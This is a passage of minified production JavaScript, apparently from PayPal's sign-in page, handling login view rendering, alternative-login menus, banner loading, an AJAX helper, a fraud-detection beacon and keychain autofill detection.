o={linkShown:{event:"identity_"+t+"_screen_try_another_way_link_shown",transition:"prepare_try_another_way"},linkPressed:{event:"identity_"+t+"_screen_try_another_way_link_pressed",transition:"process_try_another_way"},menuShown:{event:"identity_"+t+"_screen_try_another_way_menu_shown",transition:"prepare_try_another_way_menu"},menuPressed:{event:"identity_"+t+"_screen_try_another_way_menu_pressed",transition:"process_try_another_way_menu_"+r},menuClosed:{event:"identity_"+t+"_screen_try_another_way_menu_closed",transition:"close_try_another_way"}},a=u(t),f=(o[n]||{}).event||"",l=(o[n]||{}).transition||"";login.logger.log({evt:"event_name",data:f,instrument:!0}),login.logger.log({evt:"state_name",data:a,instrument:!0}),login.logger.log({evt:"transition_name",data:l,instrument:!0})}},getTawModalContainerId:function Ut(e){return"otp"!==e&&"emailOtp"!==e||!$("#verifyOtp")||$("#verifyOtp").hasClass("hide")?{login:"#login",webAuthn:"#fpLogIn",otp:"#otpLogin",emailOtp:"#otpLogin",verifyotp:"#verifyOtp",verifyemailOtp:"#verifyOtp"}[e]||"":"#verifyOtp"},logTryAnotherWayMenuAvailableOptions:function c(e,t){t=t||"";var n=(e=e||{}).children;if(!n)return;var r=u(t);t.replace("verify_","");const s={loginWithPassword:"password",setPasswordLink:"set_password",loginWithWebauthn:"biometrics",loginWithOtp:"sms_otp",loginWithEmailOtp:"email_otp",passwordRecoveryModal:"password_recovery",guestCheckout:"signup"};for(var o=[],a=0;a<n.length;a++){var f=n[a];if(f&&!$(f).hasClass("hide")){var c=f.childNodes&&f.childNodes[0],p=s[c&&c.getAttribute("id")]||"";o.push(p)}}var d=function l(e){var t=e&&e.pageName,n=e&&e.optionList;return!t||!n||"password"!==t||0!==n.length&&(1!==n.length||"sms_otp"!==n[0])}({pageName:t,optionList:o});login.logger.clientLog([{evt:"event_name",data:"identity_"+t+"_screen_try_another_way_eligibility_checked",instrument:!0},{evt:"state_name",data:r,instrument:!0},{evt:"transition_name",data:"prepare_try_another_way_options",instrument:!0},{evt:"reason",data:JSON.stringify({feature_name:"try_another_way_eligibility_check",eligibility:d?"1":"0",available_options:o}),instrument:!0}])},getCurrentPageNameIdObject:function qt(){var e=$("body").data("passKeyPlatform"),t=document.querySelector('input[name="isEmailOtp"]')&&"true"===document.querySelector('input[name="isEmailOtp"]').value,n={login:"password",fpLogIn:e?"passkey":"webAuthn",otpLogin:t?"email_otp":"sms_otp",verifyOtp:t?"verify_email_otp":"verify_sms_otp"};for(var r in n)if(n.hasOwnProperty(r)){var i=n[r],s="#"+r,o=document.querySelector(s);if(o&&!$(o).hasClass("hide"))return{id:s,pageName:i}}return null},logTawOptions:function Rt(){var e=login.utils.getCurrentPageNameIdObject();if(e){var t=e.id,n=e.pageName,r=document.querySelector(t);if(r){var i=r.querySelector(".modal-content-body");login.utils.logTryAnotherWayMenuAvailableOptions(i,n)}}},getTawMenuAvailableOptions:function f(e){var t=e.modalBody||{},n=e.pageName||"",r=t.children,i=t.parentElement;if(!r||!i)return;var s=n+"_tawOptions",o=i.querySelector('input[name="'+s+'"]'),u=o&&o.value;if(u)return u.split(",");n.replace("verify_","");const f={loginWithPassword:"password",setPasswordLink:"set_password",loginWithWebauthn:"biometrics",loginWithOtp:"sms_otp",loginWithEmailOtp:"email_otp",passwordRecoveryModal:"password_recovery",guestCheckout:"signup"};for(var l=[],c=0;c<r.length;c++){var h=r[c];if(h&&!$(h).hasClass("hide")){var p=h.childNodes&&h.childNodes[0],v=f[p&&p.getAttribute("id")]||"";l.push(v)}}return login.utils.addHiddenElement(s,l,i),l},getPageNameByIntegrationType:zt,tawClickTimes:{},attachGuestCheckoutTeslaSignUpHandlers:function tn(){var e=document.querySelector("#closeModal"),t=document.querySelector("#btnCreateAccount"),n=document.querySelector("#guestCheckoutTeslaSignUp"),r=document.querySelector("#btnReturnToMerchant");n&&(e&&addEvent(n,"click",Gt),t&&addEvent(t,"click",Yt),r&&addEvent(r,"click",en))}}}(),login.storageUtils=function(){function r(){try{var t;t=JSON.parse(window.localStorage.getItem("ulData"))||{}}catch(n){login.logger.log({evt:e,data:n,calEvent:!0,status:"ERROR"}),login.logger.pushLogs()}return t||{}}var e="LOCALSTORAGE";return{setDataByUserId:function t(t,n,i){var s,o;(o=(s=r())[i]||{})[t]=n,s[i]=o;try{window.localStorage.setItem("ulData",JSON.stringify(s))}catch(u){login.logger.log({evt:e,data:u,calEvent:!0,status:"ERROR"}),login.logger.pushLogs()}},readDataByUserId:function n(e,t){var n;return(n=r())[t]&&n[t][e]},removeDataByUserId:function i(t,n){var i;if((i=r())[n]){delete i[n][t];try{window.localStorage.setItem("ulData",JSON.stringify(i))}catch(s){login.logger.log({evt:e,data:s,calEvent:!0,status:"ERROR"}),login.logger.pushLogs()}}}}}(),login.countryList=function(){function n(t){e=Object.assign(e,t)}function r(t){return e[t]}var e={},t=login.utils;return{updateCache:n,getCache:r,showCountryDropDown:function i(e){function o(){document.querySelectorAll(".picker button").forEach((function(e){$(e.parentElement).removeClass("hide"),addEvent(e,"click",(function(){login.logger.log({evt:"actiontype",data:"click_country_picker",instrument:!0}),login.logger.log({evt:"COUNTRY_LIST",data:"CLICK_COUNTRY_PICKER",calEvent:!0}),function s(){i.insertAdjacentHTML("beforeend",r("countryList").html),setTimeout((function(){$(".countryListModal").addClass("transitionUp")}),10),window.scrollTo({top:0}),login.logger.log({evt:"actiontype",data:"country_overlay_loaded",instrument:!0}),login.logger.log({evt:"COUNTRY_LIST",data:"COUNTRY_OVERLAY_LOADED",calEvent:!0});var e=document.querySelector(".countryListModal .country-selector"),n=document.querySelector(".countryListModal .closeModal");n.focus(),addEvent(n,"click",(function(){$(".countryListModal").removeClass("transitionUp"),setTimeout((function(){$(".countryListModal").remove()}),300),login.logger.pushLogs()})),addEvent(e,"click",(function(e){var n=getEventTarget(e);if("A"===n.tagName){$(".countryListModal").removeClass("transitionUp");var r=$(n).data("countryCode"),i=$(n).data("locale"),s=$("input[name=requestUrl]").val();i&&r?(login.logger.log({evt:"actiontype",data:"click_country_change",instrument:!0}),login.logger.log({evt:"COUNTRY_LIST",data:"CLICK_COUNTRY_CHANGE",calEvent:!0}),s=t.updateParamValue(s,"country.x",r),s=t.updateParamValue(s,"locale.x",i),t.showSpinner(),setTimeout((function(){window.location.href=s}),300)):setTimeout((function(){$(".countryListModal").remove()}),300),login.logger.pushLogs()}}))}()}))}))}var i=document.querySelector(".main"),u=r("countryList");!e&&u&&(e=u,o()),e.countryList&&(document.head.insertAdjacentHTML("beforeend",e.countryList.css),n({countryList:e.countryList}),o())}}}(),login.loadResources=function(){var e=login.utils;return{showCookieBanner:function t(){for(var t,n="/signin/cookie-banner",r=$("body").data("cookieBannerVariant")||"",s={flowId:e.getFlowId()||"",cookieBannerVariant:r},o=Object.keys(s),u=0;u<o.length;u++)0===u&&(n+="?"),n=s[o[u]]?n+o[u]+"="+s[o[u]]+"&":n;$.ajax({method:"GET",url:n,success:function(e){var r,n=e&&e.data&&e.data.cookieBanner,i=0;n&&(document.querySelector("head").insertAdjacentHTML("beforeend",n.css),document.querySelector("#main").insertAdjacentHTML("beforeend",n.html),(t=document.createElement("script")).setAttribute("nonce",$("body").data("nonce")),t.innerHTML=n.js.replace(/^<script[^>]*>|<\/script>$/g,""),$("body").append(t),"function"==typeof window.bindGdprEvents&&window.bindGdprEvents(),(r=document.querySelector("#gdprCookieBanner"))&&(i=$(r).outerHeight(),document.querySelector("body").style.marginBottom=i+"px"))}})},showAppDownloadBanner:function n(){var t,n=e.getFlowId(),r=e.getReturnUri()||"",i="/signin/app-download-banner?returnUrl="+encodeURIComponent(r);n&&(i=i+"&flowId="+n),$.ajax({method:"GET",url:i,success:function(e){var n=e&&e.data&&e.data.appDownloadMobileBanner;n&&(document.querySelector("head").insertAdjacentHTML("beforeend",n.css),document.querySelector("#main").insertAdjacentHTML("beforebegin",n.html),(t=document.createElement("script")).setAttribute("nonce",$("body").data("nonce")),t.innerHTML=n.js.replace(/^<script[^>]*>|<\/script>$/g,""),$("body").append(t))}})},lazyload:function s(){var t=document.querySelector('input[name="locale.x"]'),n=t&&t.value,s="/signin/load-resource",o=0,u=2;!function a(){var t={_csrf:e.getCSRFToken(),flowId:e.getFlowId(),intent:e.getIntent()},f=!1,l=$("body").data("overlay-variant");o>u||("true"===$("body").data("lazyLoadCountryCodes")&&(t.lazyLoadCountryCodes=!0,t["locale.x"]=n,f=!0),l&&(t.overlayVariant=l,t.overlayContentVersion=$("body").data("overlay-content-version"),login.utils.addHiddenElement("overlayVariant",l,document.querySelector("form[name=login]")),f=!0),login.countryList&&"true"===$(document.body).data("showCountryDropDown")&&!login.countryList.getCache("countryList")&&(t.showCountryDropDown="true",f=!0),f&&(o+=1,$.ajax({url:s,method:"POST",data:t,success:function(e){login.countryList&&login.countryList.showCountryDropDown&&login.countryList.showCountryDropDown(e),function r(e){var s,t=document.querySelector("#phoneCode"),n=document.createDocumentFragment(),r=e&&e.countryPhoneList,i=e&&e.phoneCode;if(r&&r.length&&t){for(var o=0;o<r.length;o++)(s=document.createElement("option")).value=r[o].$value,s.setAttribute("data-code",r[o].$code),s.setAttribute("data-country",r[o].$country),s.textContent=r[o].$elt,r[o].$value===i&&s.setAttribute("selected","selected"),n.appendChild(s);t.innerHTML="",t.appendChild(n)}}(e),function i(e){var t=document.querySelector("#login");t&&e.overlayTemplate&&t.insertAdjacentHTML("beforeend",e.overlayTemplate)}(e)},fail:a})))}()}}}(),function(){var e=function(e){function t(t){return e.classList?e.classList.contains(t):!!e.className.match(new RegExp("(\\s|^)"+t+"(\\s|$)"))}function n(n){e.classList?e.classList.add(n):t(n)||(e.className+=" "+n)}function r(n){if(e.classList)e.classList.remove(n);else if(t(n)){var r=new RegExp("(\\s|^)"+n+"(\\s|$)");e.className=e.className.replace(r," ")}}if("string"==typeof e&&(e=document.querySelector(e)),e)return{hasClass:t,addClass:n,removeClass:r,data:function i(t,n){var r;if("string"==typeof t){if(r="data-"+t.replace(/([A-Z])/g,"-$1").toLowerCase(),!n)return e.getAttribute(r);e.setAttribute(r,n)}},outerHeight:function s(){var t,n=e.offsetHeight;return"undefined"==typeof getComputedStyle||(t=getComputedStyle(e),n+=parseInt(t.marginTop)+parseInt(t.marginBottom)),n},text:function a(t){var n=void 0!==e.textContent&&null!==e.textContent;if(void 0===t)return n?e.textContent:e.innerText;n?e.textContent=t:e.innerText=t},attr:function o(t,n){return n?e.setAttribute(t,n):e.getAttribute(t)},find:function u(t){return e.querySelectorAll(t)},remove:function f(){e.parentNode.removeChild(e)},toggle:function l(){t("hide")?r("hide"):n("hide")},append:function c(t){e.appendChild(t)},focus:function h(){e.focus()},val:function p(t){if(!t)return e.value;e.value=t}}};e.ajax=function(e){var t,n,r,s,i=[],o=document.querySelector("input[name=_sessionID]");if(e&&(!e||e.url)){try{t=window.XMLHttpRequest?new XMLHttpRequest:new ActiveXObject("Microsoft.XMLHTTP")}catch(u){}if(t){if(e.onErrorEnabled&&(t.onerror=function(){!t.status&&"function"==typeof e.fail&&e.fail(t)}),e.timeoutEnable){t.timeout=$("body").data("xhrTimeoutLimit");try{t.ontimeout=function(n){200!==t.status&&"function"==typeof e.fail&&(login.logger.log({evt:"TIMEOUT_WRAPPER",data:"TIMEOUT_ERROR"+e.url.replace(/\//g,"_").toUpperCase(),calEvent:!0}),login.logger.log({evt:"int_error_desc",data:"timeout_error",instrument:!0}),login.logger.pushLogs(),e.fail(t))}}catch(a){login.logger.log({evt:"TIMEOUT_WRAPPER",data:"TIMEOUT_USER_AGENT_ERROR",calEvent:!0}),login.logger.log({evt:"int_error_desc",data:"timeout_error_user_agent",instrument:!0}),login.logger.pushLogs()}}if(e.method=e.method||"POST",e.data&&"string"!=typeof e.data)for(s in e.data._sessionID=e.data._sessionID||o&&o.value,e.data)i.push(encodeURIComponent(s)+"="+encodeURIComponent(e.data[s]));if(t.onreadystatechange=function(){if(4===t.readyState){if(n=t.response||t.responseText,200===t.status&&n){try{n=JSON.parse(n)}catch(r){}"function"==typeof e.success&&e.success(n)}200!==t.status&&"function"==typeof e.fail&&0!==t.status&&e.fail(t),"function"==typeof e.complete&&e.complete()}},t.open(e.method,e.url),t.setRequestHeader("X-Requested-With","XMLHttpRequest"),"POST"===e.method&&(t.setRequestHeader("Content-type","application/x-www-form-urlencoded"),t.setRequestHeader("Accept","application/json")),"GET"===e.method&&t.setRequestHeader("Accept","application/json"),"object"==typeof e.headers&&e.headers.length)for(r in e.headers)t.setRequestHeader(r,e.headers[r]);return t.send(i&&i.join("&")),t}}},window.$=e}(),login.view=function(){function e(e){var i=document.querySelector("input[name=splitLoginContext]"),s=e&&e.model||{};return"function"==typeof window.showGdprBanner&&window.showGdprBanner(),i.value=s.splitLoginContext,s.tenantRedirectUrl?window.location.assign(s.tenantRedirectUrl):s.changeIntentToSignin?window.location.assign(s.flowExecutionUrl):(function g(e){if(!e.adsChallengeVerified)return;$("#login").removeClass("hide"),document.getElementById("ads-container")&&(document.getElementById("ads-container").style.display="none")}(s),h(s),function r(e){var t=document.querySelector("#splitEmail"),n=document.querySelector("#splitEmailSection"),r=document.querySelector("#splitPhoneSection"),i=document.querySelector("#rememberProfileEmail"),s=document.querySelector("#email"),o=document.querySelector("#phone"),u=document.querySelector(".forgotLink"),a=document.querySelector(".forgotLink .bubble-tooltip"),f=document.querySelector(".actions"),l=document.querySelector("#loginWithPhoneOption"),c=document.querySelector("#loginWithEmailOption"),h=$("body").data("phonePasswordEnabled"),p=$("body").data("phonePinEnabled"),v=document.querySelector("#signUpLinkOnEmail"),m=document.querySelector("#signUpLinkOnPassword");"inputEmail"===e.splitLoginContext||"inputPhone"===e.splitLoginContext?(t&&$(t).removeClass("hide"),i&&void 0!==e.rememberProfile&&(i.checked="true"===e.rememberProfile||!0===e.rememberProfile),function d(){var e=login.utils.isHybridLoginExperience(),t=$("body").data("isCookiedUser");login.logger.log({evt:"state_name",data:e?"begin_hybrid_login":"begin_email",instrument:!0}),login.logger.log({evt:"transition_name",data:e?"prepare_hybrid":"prepare_email",instrument:!0}),login.logger.log({evt:"is_cookied",data:t?"Y":"N",instrument:!0}),login.logger.log({evt:"login_method",data:"unknown",instrument:!0}),login.logger.pushLogs()}(),v&&$(v).removeClass("hide"),m&&$(m).addClass("hide")):("autoSend"!==e.tpdVariant&&t&&$(t).addClass("hide"),o&&o.blur(),s&&s.blur()),n&&"inputEmail"===e.splitLoginContext&&($(n).removeClass("hide"),s.removeAttribute("disabled"),p||h?(l&&$(l).removeClass("hide"),c&&$(c).addClass("hide"),u&&$(u).addClass("hide"),a&&$(a).addClass("hide")):u&&$(u).removeClass("hide"),$(f).removeClass("phonePresent"),r&&$(r).addClass("hide"),o&&(o.value="",o.setAttribute("disabled","disabled"))),r&&"inputPhone"===e.splitLoginContext&&(n&&$(n).addClass("hide"),$(r).removeClass("hide"),(p||h)&&(l&&$(l).addClass("hide"),c&&$(c).removeClass("hide")));login.geoEnablement&&login.geoEnablement.setGeoMessage(e)}(s),function o(e){var t=document.querySelector(".educationMessage");!0===e.showEducationMessage&&"inputPin"===e.splitLoginContext?t&&$(t).removeClass("hide"):t&&$(t).addClass("hide")}(s),u(s),function a(e){document.querySelector("input[name=splitLoginContext]");var a,n=document.querySelector(".profileDisplayEmail"),r=document.querySelector(".profileDisplayName"),i=document.querySelector(".profileRememberedEmail"),s=document.querySelector(".profileIcon"),o=document.querySelector("#email"),u=document.querySelector(".profileDisplayPhoneCode");if("autoSend"===e.tpdVariant)return;if(!e.profile)return s&&($(s).addClass("hide"),$(s).text(""),s.removeAttribute("style"),$(s).removeClass("profilePhoto"),$(s).removeClass("profileInitials"),$(s).addClass("profilePlaceHolderImg")),n&&$(n).text(""),u&&$(u).text(""),r&&$(r).addClass("hide"),o.value="",i&&$(i).addClass("hide"),void(window.dispatchEvent&&window.dispatchEvent(createNewEvent("resize")));a=e.profile.phone||e.profile.email,a&&"inputEmail"!==e.splitLoginContext&&"inputPhone"!==e.splitLoginContext&&(n&&$(n).text(a),i&&$(i).removeClass("hide")),e.profile.phoneCode&&u&&$(u).text(e.profile.phoneCode)}(s),function f(e){function t(e,t){return login.utils.getQueryParamFromUrl("ulPage",e)?login.utils.updateParamValue(e,"ulPage",t):e}var o,u,a,f,n=$(document.querySelector("#signupContainer")),r="inputEmail"===e.splitLoginContext||"inputPhone"===e.splitLoginContext,i=e.contextualLogin&&e.contextualLogin.guestEscapeHatch,s=e.isOtpSmsUser;if(!n)return;a=$(signupContainer.querySelector("#createAccount")),o="true"===n.data("hideOnEmail")||i||s,u="true"===n.data("hideOnPass"),f=a&&a.attr("href"),r?(o?n.addClass("hide"):n.removeClass("hide"),a&&a.attr("href",t(f,"email"))):(u?n.addClass("hide"):n.removeClass("hide"),a&&a.attr("href",t(f,"pwd")))}(s),function m(e){function n(e){for(var t=document.querySelectorAll(".captcha-container"),n=0;n<t.length;n++)e?$(t[n]).removeClass("hide"):$(t[n]).addClass("hide")}var t;if(n(e.captcha),!e.captcha)return;if(t=login.utils.getActiveCaptchaElement({value:e.splitLoginContext}),!t)return;e.captcha.captchaImgUrl&&t.image&&t.image.setAttribute("src",e.captcha.captchaImgUrl),e.captcha.captchaAudioUrl&&t.audioTag&&t.audioTag.setAttribute("src",e.captcha.captchaAudioUrl),e.captcha.captchaAudioUrl&&t.audioLink&&t.audioLink.setAttribute("href",e.captcha.captchaAudioUrl)}(s),function l(e){var o,t=document.querySelector("footer"),n=document.querySelector("#login"),r=document.querySelector("#login .contentContainer"),i=document.querySelector("#verification .contentContainer"),s=document.querySelector("#verification");e.verification?(o=document.querySelector(".activeContent"),$(n).addClass("hide"),$(s)&&$(s).removeClass("hide"),$(t).addClass("footerWithIcon"),$(o).removeClass("activeContent"),$(i)&&$(i).addClass("activeContent"),function c(e){if(!e)return;var t=document.querySelector(".account"),n=document.querySelector(".mobileNotification .pin"),r=document.querySelector(".twoDigitPin"),i=document.querySelector("#uncookiedMessage"),s=document.querySelector("#cookiedMessage");$(t).text(e.email),e.pin&&n?($(n).text(e.pin),$(r).text(e.pin),r.setAttribute("style","font-weight: bold"),$(i).removeClass("hide")):$(s).removeClass("hide")}(e.verification),login.tpdLogin&&login.tpdLogin.instrumentVerificationViewRendered()):(o=document.querySelector(".activeContent"),$(n).removeClass("hide"),$(s)&&$(s).addClass("hide"),$(t).removeClass("footerWithIcon"),$(o).removeClass("activeContent"),$(r).addClass("activeContent"))}(s),function p(e){var t=document.querySelector("#emailSubTagLine"),n=document.querySelector("#phoneSubTagLine"),r=document.querySelector("#pwdSubTagLine"),i=document.querySelector("#eligiblePurchaseSubTagLine"),s=document.querySelector("#pwdSecondarySubTagLine");"inputPassword"===e.splitLoginContext||"inputPin"===e.splitLoginContext?(t&&$(t).addClass("hide"),n&&$(n).addClass("hide"),r&&$(r).removeClass("hide"),e.showEligiblePurchaseSubTagLine?(r&&$(r).addClass("hide"),i&&$(i).removeClass("hide")):s&&$(s).removeClass("hide")):"inputPhone"===e.splitLoginContext?(n&&$(n).removeClass("hide"),t&&$(t).addClass("hide"),r&&$(r).addClass("hide"),s&&$(s).addClass("hide")):(t&&$(t).removeClass("hide"),n&&$(n).addClass("hide"),r&&$(r).addClass("hide"),i&&$(i).addClass("hide"),s&&$(s).addClass("hide"))}(s),function n(e){var t=document.querySelector("#email"),n=document.querySelector('label[for="email"]'),r=document.querySelector("#phone"),i=document.querySelector("#isTpdOnboarded"),s=document.querySelector(".countryPhoneSelectWrapper"),o=document.querySelector("#login_emaildiv"),u=document.querySelector(".profileRememberedEmail");e.profile||(t&&t.removeAttribute("disabled"),r&&r.removeAttribute("disabled")),s&&$(s).addClass("hide"),o&&$(o).removeClass("phoneInputWrapper"),!e.profile&&u&&$(u).removeClass("cookiedProfile"),!e.phone&&r?r.value=null:e.phone&&t&&(t.value=null),e.notifications&&e.hybridInEmailOnlyMode&&e.contextualLogin&&e.contextualLogin.content&&(t&&$(t).attr("placeholder",e.contextualLogin.content.emailLabel),n&&$(n).text(e.contextualLogin.content.emailLabel),t&&$(t).attr("data-hybrid-in-email-only-mode",e.hybridInEmailOnlyMode)),i&&e.profile&&e.isTpdOnboarded&&(i.value=e.isTpdOnboarded)}(s),login.verification&&login.verification.updateView(s),void function t(e){var t=document.querySelector("#password").parentElement,n=t.parentElement,r=e.webAuthnFpIconEnabled;if(e.partyIdHash&&(login.utils.addHiddenElement("partyIdHash",e.partyIdHash,document.querySelector("form[name=login]")),document.body.setAttribute("data-party-id-hash",e.partyIdHash)),e.webAuthnLoginContext&&login.webAuthn&&login.webAuthn.setContext&&!e.verification){if(login.webAuthn.setContext(e),!r)return;document.body.setAttribute("data-web-authn-login-context",e.webAuthnLoginContext),login.utils.addHiddenElement("webAuthnLoginContext",e.webAuthnLoginContext,document.querySelector("form[name=login]")),e.wanSupportLookup&&document.body.setAttribute("data-web-authn-support-lookup","true"),n&&$(n).addClass("errorMessageFp"),e.isRtl?t&&$(t).addClass("rtlFpPlaceholder"):t&&$(t).removeClass("rtlFpPlaceholder")}}(s))}function u(e){var t=document.querySelector("#splitPassword"),n=document.querySelector("#splitPasswordSection"),r=document.querySelector("#splitPinSection"),o=document.querySelector("#password"),u=document.querySelector("#pin"),a=document.querySelector("#rememberProfilePassword"),f=document.querySelector(".forgotLink"),l=document.querySelector("#phone"),c=document.querySelector("#signUpLinkOnEmail"),h=document.querySelector("#signUpLinkOnPassword"),p=$("body").data("usePassKey"),d=document.querySelector('#splitEmail input[type="password"]');d&&d.value.trim()&&(o.value=d.value,d.value=""),"inputPassword"===e.splitLoginContext||"inputPin"===e.splitLoginContext?(t&&"autoSend"!==e.tpdVariant&&$(t).removeClass("hide"),function s(e){var t=(e=e||{}).appleIdpJson;if("string"==typeof t&&"function"==typeof login.siapple)return login.siapple({appleIdpJson:t})}(e),function i(e){e.enableSmartlock&&login.smartLock(e)}(e),a&&(a.checked="true"===e.rememberProfile||!0===e.rememberProfile),"inputPassword"===e.splitLoginContext&&!e.tpdVariant&&f&&$(f).removeClass("hide"),"string"==typeof e.appleIdpJson&&login.utils.addHiddenElement("appleIdpJson",e.appleIdpJson,document.querySelector("form[name=login]")),("disabled"===$(o).attr("disabled")||p)&&o.removeAttribute("disabled"),"linked"!==e.smartlockStatus&&!e.verification&&!e.otpInterstitialHtml&&function v(e){var u,t=document.querySelector("#password"),n=document.querySelector("#phone"),r=login.utils.isFieldPrefilled(t),i=login.utils.isHybridLoginExperience(),s=i?"prepare_hybrid_pwd":"prepare_pwd",o=$("body").data("isCookiedUser");s+=login.utils.getKmliCb()?"_ot":"";try{u=(JSON.parse(window.localStorage.getItem("ulData"))||{}).startTime}catch(f){login.logger.log({evt:"UNIFIED_LOGIN",data:"local_storage_error_out",calEvent:!0,status:"ERROR"}),login.logger.pushLogs()}document.querySelector("#moreOptionsContainer")&&!0===e.moreOptions&&(s+="_more_opt",login.logger.log({evt:"exp_shown",data:"tpd",instrument:!0})),login.utils.logCPLData({startTime:u,status:"success",flowName:"Hybrid Pwd Login"}),login.logger.log({evt:"state_name",data:i?"begin_hybrid_pwd":"begin_pwd",instrument:!0}),login.logger.log({evt:"pub_cred_type",data:n&&n.value?"phone":"email",instrument:!0}),login.logger.log({evt:"transition_name",data:s,instrument:!0}),login.logger.log({evt:"is_cookied",data:o?"Y":"N",instrument:!0}),login.logger.log({evt:"autofill",data:r?"Y":"N",instrument:!0}),login.logger.log({evt:"login_method",data:"password",instrument:!0}),login.logger.pushLogs()}(e),c&&$(c).addClass("hide"),h&&$(h).removeClass("hide"),window.dispatchEvent&&window.dispatchEvent(createNewEvent("resize"))):(t&&$(t).addClass("hide"),o.value="",u&&(u.value="")),n&&"inputPassword"===e.splitLoginContext&&(r&&$(r).addClass("hide"),$(n).removeClass("hide")),r&&"inputPin"===e.splitLoginContext&&($(n).addClass("hide"),$(r).removeClass("hide")),e.profile&&e.profile.phone&&l&&(l.value=e.profile.phone),$("body").hasClass("desktop")&&o.focus()}function h(e){for(var t=document.querySelectorAll(".notifications"),n=e.isOtpSmsUser,r=0;r<t.length;r++)$(t[r]).text(""),e.notifications&&e.notifications.msg&&(t[r].innerHTML='<p class="notification '+e.notifications.type+'" role="alert">'+e.notifications.msg+"</p>");e.notifications&&n&&login.utils.hideSpinner()}return login.storeInstance=login.store(),login.pubsub.subscribe("STATE_UPDATED",e),{render:e,updateNotificationView:h}}(),"function"!=typeof Object.assign&&(Object.assign=function(e,t){if(null===e)throw new TypeError("Cannot convert undefined or null to object");for(var n=Object(e),r=1;r<arguments.length;r++){var i=arguments[r];if(null!==i)for(var s in i)Object.prototype.hasOwnProperty.call(i,s)&&(n[s]=i[s])}return n}),String.prototype.trim||(String.prototype.trim=function(){return this.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,"")}),login.fn=function(){function t(t){var n=document.getElementById("fconfig");n&&n.parentNode&&n.parentNode.removeChild(n),(n=document.createElement("script")).id="fconfig",n.type="application/json",n.setAttribute("fncls",e),n.setAttribute("nonce",$("body").data("nonce"));var r={f:t.fnSessionId,s:t.sourceId,b:t.beaconUrl,ts:{type:"UL",fields:[{id:"email",min:6},{id:"password",min:6}],delegate:!1}};t.isSandbox&&(r.sandbox=!0),n.text=JSON.stringify(r),document.body.appendChild(n)}function n(e){var t=document.createElement("script");t.src=e.fnUrl,t.onload=function(){!function r(e){e.enableSpeedTyping&&"function"==typeof initTsFb&&initTsFb({detail:{type:"UL",fields:["email","password"]}})}(e)},document.body.appendChild(t)}function i(e){PAYPAL.syncData&&"function"==typeof PAYPAL.syncData.initSync&&e&&(e.detail={type:"UL",fields:["email","password"]},PAYPAL.syncData.initSync(e))}var e="fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99";return{initialize:function a(){"true"!==$("body").data("fnWithoutIframeTreatmentEnabled")&&function u(){return!(!$("body").data("enableFnBeaconOnWebViews")&&/(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(window.navigator.userAgent))}()&&PAYPAL&&PAYPAL.ulData&&PAYPAL.ulData.fnUrl&&(t(PAYPAL.ulData),n(PAYPAL.ulData)),i(PAYPAL.ulSync)},initializeFnSync:i,addFnSyncData:function s(){if(PAYPAL.syncData&&"function"==typeof PAYPAL.syncData.flushData)try{PAYPAL.syncData.flushData()}catch(e){}else login.logger.log({evt:"FN_PAYLOAD",data:"fn_sync_data_not_load",instrument:!0}),login.logger.pushLogs()},updateFnSyncContext:function o(e){if(e&&e.sourceId&&"object"==typeof PAYPAL.ulSync){var t=e.sourceId;PAYPAL.ulSync.isFnWithoutIframeEnabled&&-1===t.indexOf("_TRMT")&&(t+="_TRMT"),PAYPAL.ulSync.sourceId=t,i(PAYPAL.ulSync)}}}}();var initializeKeychainAutofillDetector=function(e){var t="autofill-email",n="autofill-pwd",r="change-email",i="change-pwd",s={};s[t]=[t,i],s[r]=[r,n];var o={};return o[t]=[t,r,n,i],o[r]=[r,t,r,n],function(a){function v(e){return p=[],l(e)}function m(){return!f||p[0]!==n&&p[0]!==i?g(p,d[t])||g(p,d[r])?v():void 0:v()}function g(e,t){if(!Array.isArray(e)||!Array.isArray(t))return!1;if(e.length<t.length)return!1;var n=t[0],r=e.lastIndexOf(n);if(r<0)return!1;for(var i=!0,s=1;s<t.length;s++)e[r+s]!==t[s]&&(i=!1);return i}var f=(a=a||{}).isIosWebView,l=a.callback,c=a.emailInputDOM,h=a.pwdInputDOM,p=[],d=f?s:o;return function y(s,o){s&&o&&(e.addAutofillEventHandler(s,(function(){return p.push(t)})),e.addAutofillEventHandler(o,(function(){return p.push(n),m()})),addEvent(s,"change",(function(){return p.push(r)})),addEvent(o,"change",(function(){return p.push(i),m()})))}(c,h)}}(login.utils),Keychain=function(e){function a(){}function f(e,t){var n=document.querySelector("input[name=splitLoginContext]");return(e!==i.PPOT||"inputPassword"===n.value)&&(e!==i.EMAIL||t!==r.EIGHTBALL&&t!==r.RISKY_LOGIN&&t!==r.CONNECT&&t!==r.CHECKOUT&&t!==r.DONATE)}function h(e,n,r){var i=r,s=$("body").data("csrfToken"),a=o.getFlowId(),f=document.querySelector("#keychain-interstitial #keychain-form-container"),l=document.createElement("form"),c=document.createElement("input"),h=document.createElement("input"),p=document.createElement("button");return $(l).attr("method","POST"),$(l).attr("action","/signin/keychain/handle/register"),$(c).attr("type","text"),$(c).attr("name","email"),$(c).attr("value",i),o.addHiddenElement("returnUrl",e,l),o.addHiddenElement("_csrf",s,l),o.addHiddenElement("flowId",a,l),$(h).attr("type","password"),$(h).attr("name","password"),$(h).attr("value",n),$(p).attr("type","submit"),$(l).append(c),$(l).append(h),$(l).append(p),$(f).append(l),u.log({evt:t,data:"SUCCEEDED_MOUNT_HIDDEN_FORM",calEvent:!0}),u.pushLogs(),p}function p(){var e=document.querySelector("#keychain-interstitial"),n=document.querySelector(".transitioning"),r=document.querySelector(".lockIcon"),i=document.querySelector("#login"),s=document.querySelector("footer.footer");return i&&$(i).addClass("hide"),s&&$(s).addClass("hide"),n&&$(n).addClass("hide"),r&&$(r).addClass("hide"),$(e).removeClass("hide"),u.log({evt:t,data:"PREPARE_INTERSTITIAL",calEvent:!0}),u.log({evt:"state_name",data:"keychain_interstitial",instrument:!0}),u.log({evt:"transition_name",data:"prepare_keychain_interstitial",instrument:!0}),u.pushLogs()}function d(e,n){var r=document.querySelector(".transitioning"),i=document.querySelector(".lockIcon"),s=document.querySelector("#login"),o=document.querySelector("footer.footer"),a=document.createElement("div");return 